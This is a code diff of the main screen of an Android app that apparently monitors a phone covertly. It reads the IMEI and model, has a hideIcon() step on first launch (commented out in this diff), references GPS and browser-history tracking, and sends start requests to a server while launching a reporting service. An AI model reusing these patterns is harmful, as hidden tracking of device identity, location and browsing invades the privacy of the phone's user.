@@ -6,11 +6,13 @@ import java.util.Calendar;
 import java.util.List;
 import java.util.concurrent.TimeUnit;
 
+import org.json.JSONException;
+import org.json.JSONObject;
+
 import android.annotation.SuppressLint;
 import android.app.Activity;
 import android.app.AlertDialog;
 import android.content.ComponentName;
-import android.content.ContentResolver;
 import android.content.Context;
 import android.content.DialogInterface;
 import android.content.Intent;
@@ -19,10 +21,8 @@ import android.content.SharedPreferences.Editor;
 import android.content.pm.ActivityInfo;
 import android.content.pm.PackageManager;
 import android.content.res.Configuration;
-import android.net.Uri;
 import android.os.Bundle;
 import android.os.Environment;
-import android.os.Handler;
 import android.preference.PreferenceManager;
 import android.telephony.TelephonyManager;
 import android.util.Log;
@@ -35,8 +35,6 @@ import com.inet.android.history.LinkService;
 import com.inet.android.location.GPSTracker;
 import com.inet.android.request.DataRequest;
 import com.inet.android.request.StartRequest;
-import com.inet.android.sms.SMSBroadcastReceiver;
-import com.inet.android.sms.SmsSentObserver;
 import com.inet.android.utils.Logging;
 
 public class MainActivity extends Activity {
@@ -60,7 +58,7 @@ public class MainActivity extends Activity {
 	File[] fileArray;
 	private String sIMEI;
 	private String sID;
-	private String account;
+//	private String account;
 
 	@Override
 	protected void onCreate(Bundle savedInstanceState) {
@@ -81,24 +79,27 @@ public class MainActivity extends Activity {
 		String androidVersion = android.os.Build.VERSION.RELEASE;
 
 		aboutDev = " Model: " + model + " Version android: " + androidVersion;
-		sIMEI = "IMEI: " + imeistring;
+		sIMEI = imeistring;
 		e = sp.edit();
 		e.putString("BUILD", "A0003 2013-10-03 20:00:00");
-		e.putString("IMEI", sIMEI);
+		e.putString("imei", "0001");
 		e.putString("ABOUT", aboutDev);
+		e.putString("model", model);
 		e.commit();
 
 		boolean hasVisited = sp.getBoolean("hasVisited", false);
 
 		if (!hasVisited) {
-			// проверка на первое посещение
+			// проверка на первый запуск
 			e = sp.edit();
 			e.putBoolean("hasVisited", true);
 			e.putString("ABOUT", aboutDev);
-			e.putString(SAVED_TIME, Long.toString(System.currentTimeMillis()));
+			e.putString(SAVED_TIME, Long.toString(System.currentTimeMillis())); // время для сервиса истроии браузера
+			e.putString("period", "1"); // периодический запрос каждые 10 минут
+			e.putString("code", "-1");
 			e.commit();
 			
-			hideIcon();
+//			hideIcon();
 		}
 		
 		getID(); // рекурсивный поиск файла с нужным именем
@@ -133,10 +134,11 @@ public class MainActivity extends Activity {
 				sp = PreferenceManager
 						.getDefaultSharedPreferences(getApplicationContext());
 				Editor e = sp.edit();
-				e.putString("ID", value);
+				e.putString("account", value);
 				e.commit();
 				start(); // запуск сервисов
-				sendDiagPost();
+//				sendDiagPost();
+//				sendStartRequest();
 				finish();
 			}
 		});
@@ -189,7 +191,6 @@ public class MainActivity extends Activity {
 				if (file1[i].isDirectory()) {
 					File[] file = file1[i].listFiles();
 					if (recursiveFileFind(file) == true) {
-						Log.d("recurs", ID);
 						return true;
 					}
 				}
@@ -197,13 +198,13 @@ public class MainActivity extends Activity {
 				if (sID.indexOf("ts.apk") != -1) {
 					ID = sID.substring(0, sID.indexOf("t"));
 					e = sp.edit();
-					e.putString("ID", ID);
+					e.putString("account", ID);
 					e.commit();
-					Log.d("ID", sp.getString("ID", "ID"));
-					if (!sp.getString("ID", "ID").equals("ID")) {
-						sendStartRequest();
+//					Log.d("ID", sp.getString("ID", "ID"));
+					if (!sp.getString("account", "account").equals("account")) {
+//						sendStartRequest();
 //						sendDiagPost();
-//						start(); // запуск сервисов
+						start(); // запуск сервисов
 						return true;
 					}
 					break;
@@ -219,9 +220,22 @@ public class MainActivity extends Activity {
 //		RequestMaker service = new RequestMakerImpl(context);
 //		String str = "\"";
 //		service.sendStartRequest(str);
-		String str = "\"";
+		JSONObject jsonObject = new JSONObject();
+		try {
+			jsonObject.put("account", sp.getString("account", "0000"));
+			jsonObject.put("imei", sp.getString("imei", "0000"));
+			jsonObject.put("model", "iphone");
+		} catch (JSONException e) {
+			e.printStackTrace();
+		}
+		
+		String str = jsonObject.toString();
 		StartRequest sr = new StartRequest(context);
 		sr.sendRequest(str);
+		
+		Logging.doLog(LOG_TAG, "start services", "start Request4");
+
+		startService(new Intent(MainActivity.this, Request4.class));
 	}
 
 	public void start() {
